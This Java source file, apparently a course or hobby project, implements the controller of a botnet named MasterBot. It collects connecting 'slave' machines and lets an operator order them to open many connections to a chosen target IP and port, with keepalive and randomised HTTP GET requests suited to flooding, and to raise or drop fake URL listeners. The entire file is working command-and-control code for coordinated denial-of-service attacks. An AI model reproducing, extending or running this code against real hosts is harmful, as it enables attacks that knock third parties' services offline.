import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Random;

public class MasterBot extends Thread {
	static List<Socket> slaves = new ArrayList<Socket>();
	static List<Socket> slavesForFakeUrl = new ArrayList<Socket>();
	static List<String> slavesString = new ArrayList<String>();
	static List<String> slavesStringForFakeURl = new ArrayList<String>();
	static ServerSocket serverSocket;
	static String slaveSelected, targetIp, targetPort, numberOfConnetions, url, targetFakeUrl, targetFakePort;
	static boolean keepAlive;
	static Socket connectMe;
	public static ArrayList<Socket> connected = new ArrayList<>();
	static boolean upFakeUrl = true;
	static ServerSocket serverSocketForFakeUrl;
	
	public static void main(String [] args) throws IOException {
		int port;
		if(args.length == 2 && args[0].equals("-p") && Integer.parseInt(args[1])!=0){
			port = Integer.parseInt(args[1]);
			serverSocket = new ServerSocket(port);
			//MasterBot masterBotObj = new MasterBot();
			//masterBotObj.start();
			Thread masterThread = new Thread(new SocketClientAccept(serverSocket, port), "masterThread");
			masterThread.start();
			
			String inputStringCLI;
			BufferedReader inpurCLI = new BufferedReader(new InputStreamReader(System.in));
	        System.out.print(">");
			while (true){
				inputStringCLI = inpurCLI.readLine();
				if (inputStringCLI.equals(""))
					continue;
				if (inputStringCLI.startsWith("list")){
					if(slavesString.size() == 0){
						//System.out.println("There are no slaves available.");
						System.out.println("SlaveHostName"+"\t"+"IPAddress"+"\t"+"SourcePortNumber"+"\t"+"RegistrationDate");
					} else {
						for(int i=0; i<slavesString.size(); i++) {
							if(!slaves.get(i).isClosed()){
								if(i==0){
									System.out.println("SlaveHostName"+"\t"+"IPAddress"+"\t"+"SourcePortNumber"+"\t"+"RegistrationDate");
								}
								System.out.println(slavesString.get(i));
							}
						}
					}
				} else if (inputStringCLI.startsWith("connect "))	{
					String[] splittedCommand = inputStringCLI.split("\\s+");
					if(splittedCommand.length == 4) {
						slaveSelected = splittedCommand[1];
						targetIp = splittedCommand[2];
						targetPort = splittedCommand[3];
						numberOfConnetions = "1";
						keepAlive = false;
						callCreateSocket(slaves, slaveSelected, targetIp, targetPort, numberOfConnetions, false, "");
					} else if(splittedCommand.length == 5) {
						slaveSelected = splittedCommand[1];
						targetIp = splittedCommand[2];
						targetPort = splittedCommand[3];
						numberOfConnetions = "1";
						keepAlive = false;
						url = "";
						if(splittedCommand[4].toLowerCase().contains("keepalive")){
							keepAlive = true;
						}
						if(splittedCommand[4].contains("url")) {
							url = splittedCommand[4];
						}
						if(splittedCommand[4].matches("[0-9]+") && splittedCommand[4].length() >= 1) {
							numberOfConnetions = splittedCommand[4];
						}
						callCreateSocket(slaves, slaveSelected, targetIp, targetPort, numberOfConnetions, keepAlive, url);
					} else if(splittedCommand.length == 6) {
						slaveSelected = splittedCommand[1];
						targetIp = splittedCommand[2];
						targetPort = splittedCommand[3];
						numberOfConnetions = "1";
						keepAlive = false;
						url = "";
						if(splittedCommand[4].toLowerCase().contains("keepalive") || splittedCommand[5].toLowerCase().contains("keepalive")) {
							keepAlive = true;
						}
						if(splittedCommand[4].contains("url")) {
							url = splittedCommand[4];
						}
						if(splittedCommand[5].contains("url")) {
							url = splittedCommand[5];
						}
						if(splittedCommand[4].matches("[0-9]+") && splittedCommand[4].length() >= 1) {
							numberOfConnetions = splittedCommand[4];
						}
						if(splittedCommand[5].matches("[0-9]+") && splittedCommand[5].length() >= 1) {
							numberOfConnetions = splittedCommand[5];
						}
						callCreateSocket(slaves, slaveSelected, targetIp, targetPort, numberOfConnetions, keepAlive, url);
					} else if(splittedCommand.length == 7) {
						slaveSelected = splittedCommand[1];
						targetIp = splittedCommand[2];
						targetPort = splittedCommand[3];
						keepAlive = false;
						numberOfConnetions = splittedCommand[4];
						url = "";
						if(splittedCommand[5].toLowerCase().contains("keepalive")) {
							keepAlive = true;
						} else if(splittedCommand[6].toLowerCase().contains("keepalive")) {
							keepAlive = true;
						} 
						if(splittedCommand[6].contains("url")) {
							url = splittedCommand[6];
						} else if(splittedCommand[5].contains("url")) {
							url = splittedCommand[5];
						}
						callCreateSocket(slaves, slaveSelected, targetIp, targetPort, numberOfConnetions, keepAlive, url);
					} else {
						System.out.println("Invalid command! Provide correct command and it's arguments.");
					}
				} else if (inputStringCLI.startsWith("disconnect "))	{	 
					String[] arrayOfString = inputStringCLI.split("\\s+");
					if(arrayOfString.length == 3) {
						slaveSelected = arrayOfString[1];
						targetIp = arrayOfString[2];
						targetPort = "0";
						 if(slaveSelected.equalsIgnoreCase("all")){
							 for(int k=0; k<slaves.size();k++) {
								 disconnect(Integer.parseInt(targetPort),targetIp);
						 	}
						} else 	{
							disconnect(Integer.parseInt(targetPort),targetIp);
						}
					}
					else if(arrayOfString.length == 4) {
						slaveSelected = arrayOfString[1];
						targetIp = arrayOfString[2];
						targetPort = arrayOfString[3];
						 if(slaveSelected.equalsIgnoreCase("all")){
							 for(int k=0; k<slaves.size();k++) {
								 disconnect(Integer.parseInt(targetPort),targetIp);
						 	}
						} else 	{
							disconnect(Integer.parseInt(targetPort),targetIp);
						}			
					} else {
						System.out.println("Invalid command! Provide correct command and it's arguments.");
					}
				} else if(inputStringCLI.startsWith("rise-fake-url")) {
					String[] arrayOfString = inputStringCLI.split("\\s+");
					if(arrayOfString.length == 3) {
						targetFakeUrl = arrayOfString[2];
						targetFakePort = arrayOfString[1];
						raiseFakeUrl(targetFakeUrl, targetFakePort);
					}
				} else if(inputStringCLI.startsWith("down-fake-url")) {
					String[] arrayOfString = inputStringCLI.split("\\s+");
					if(arrayOfString.length == 3) {
						targetFakeUrl = arrayOfString[2];
						targetFakePort = arrayOfString[1];
						downFakeUrl(targetFakeUrl, targetFakePort);
					}
				} else {
					System.out.println("Invalid command! Provide correct command and it's arguments.");
				}
		        System.out.print(">");
			}
		} else {
			System.out.println("Invalid command! Provide correct command and it's arguments.");
		}
	}

	private static void raiseFakeUrl( String targetFakeUrl2, String targetFakePort2) throws IOException {
		for(int i=0; i<slaves.size(); i++) {
			PrintStream p = new PrintStream(slaves.get(i).getOutputStream());
			p.println("raiseFakeUrl "+targetFakeUrl2+" "+(Integer.parseInt(targetFakePort2)+i));
			p.flush();
		}
	}

	private static void downFakeUrl(String targetFakeUrl2, String targetFakePort2) throws IOException {
		for(int i=0; i<slaves.size(); i++) {
			PrintStream p = new PrintStream(slaves.get(i).getOutputStream());
			p.println("downFakeUrl "+targetFakeUrl2+" "+(Integer.parseInt(targetFakePort2)+i));
			p.flush();
		}
	}

	/**
	 * @throws IOException
	 */
	private static void callCreateSocket(List<Socket> slaves, String slaveSelected, String targetIp, String targetPort, String numberOfConnetions, boolean keepAlive, String url) throws IOException {
		if(slaveSelected.equalsIgnoreCase("all"))	{
			for(int k=0; k<slaves.size();k++)	{
				for(int j = 0; j < Integer.parseInt(numberOfConnetions);j++) {
					createSocket(slaves.get(k),Integer.parseInt(targetPort),targetIp,Integer.parseInt(numberOfConnetions), keepAlive,url);
				}
			}
		} else {
			for(int j =0; j< slaves.size();j++) {
				if(slaveSelected.equalsIgnoreCase(slaves.get(j).getInetAddress().getHostName().toString())) {
					for(int k = 0; k < Integer.parseInt(numberOfConnetions);k++) {
						createSocket(slaves.get(j),Integer.parseInt(targetPort),targetIp,Integer.parseInt(numberOfConnetions), keepAlive,url);
					}
				}
			}
		}
	}
	
	@SuppressWarnings("deprecation")
	public static void createSocket(Socket newConnect, int targetPort, String target, int numberOfConnetions, boolean keepAlive, String url) throws IOException {
		try {
			//connectMe = new Socket();
			//connectMe.connect(new InetSocketAddress(target, targetPort));
			connectMe = new Socket(target, targetPort);
			if(keepAlive==true) {
				connectMe.setKeepAlive(true);
	            PrintStream p = new PrintStream(newConnect.getOutputStream());
				p.println("Socket created with keepalive enabled");
				p.flush();
			}
			if(url.length() != 0)
	        {	            
	            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connectMe.getOutputStream(), "UTF8"));
	            url = url.substring(4, url.length());
	            url = url + getRandString();
	            //System.out.println(url);
				writer.write("GET "+url +"\r\n");
				writer.write("\r\n");
				writer.flush();
				BufferedReader reader = new BufferedReader(new InputStreamReader(connectMe.getInputStream()));
				String responseLine;
				if((responseLine = reader.readLine()) != null)
				{
		            PrintStream p = new PrintStream(newConnect.getOutputStream());
					p.println(responseLine+ " random string used "+url);
		            //p.println(responseLine);
					p.flush();
				}	            
	            
	        }
			connected.add(connectMe);
		}catch(IOException e) {
			e.printStackTrace();
			System.exit(-1);
		}
	}
	
	public static void disconnect(int tarport, String TarAdd) {
		try {		
			if(tarport == 0) {
				for(int i = 0; i < connected.size(); i++) {
					if(!connected.get(i).isClosed()) {
							//System.out.println("Connection to "+connected.get(i).getInetAddress().getHostName()+" "+connected.get(i).getLocalPort()+" is closed\n");
							connected.get(i).close();
					} else {
						//System.out.println("Connection is already closed\n");
					}
				}
			} else {
					for(int i = 0; i < connected.size(); i++) {
						if(connected.get(i).getPort() == tarport) {
							if(!connected.get(i).isClosed()) {
								//System.out.println("Connection to "+connected.get(i).getInetAddress().getHostName()+" "+connected.get(i).getLocalPort()+" is closed\n");
								connected.get(i).close();
							} else {
								//System.out.println("Connection is already closed\n");
							}
						}
					}
				}
		} catch(IOException e) {
			//System.out.println("Probably connection is lost");
			e.printStackTrace();
			System.exit(-1);
		}
	}

	public static String getRandString() {
	    String RANDCHARS = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
	    StringBuilder rand = new StringBuilder();
	    Random rnd = new Random();
	    while (rand.length() < 10) {
	        int index = (int) (rnd.nextFloat() * RANDCHARS.length());
	        rand.append(RANDCHARS.charAt(index));
	    }
	    String randStr = rand.toString();
	    return randStr;
	}
}

class SocketClientAccept implements Runnable {
	int Port;
	ServerSocket serverSocket;
	SocketClientAccept(ServerSocket serversoc, int p) {
		Port = p;
		serverSocket = serversoc;
	}
	public void run() {
		while (true) {
			try {
				Socket server = serverSocket.accept();
				MasterBot.slaves.add(server);
				MasterBot.slavesString.add(server.getInetAddress().getHostName()+"\t"+server.getInetAddress().getHostAddress()+"\t"+serverSocket.getLocalPort()+"\t"+"\t"+"\t"+new SimpleDateFormat("yyyy/MM/dd").format(Calendar.getInstance().getTime()));
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}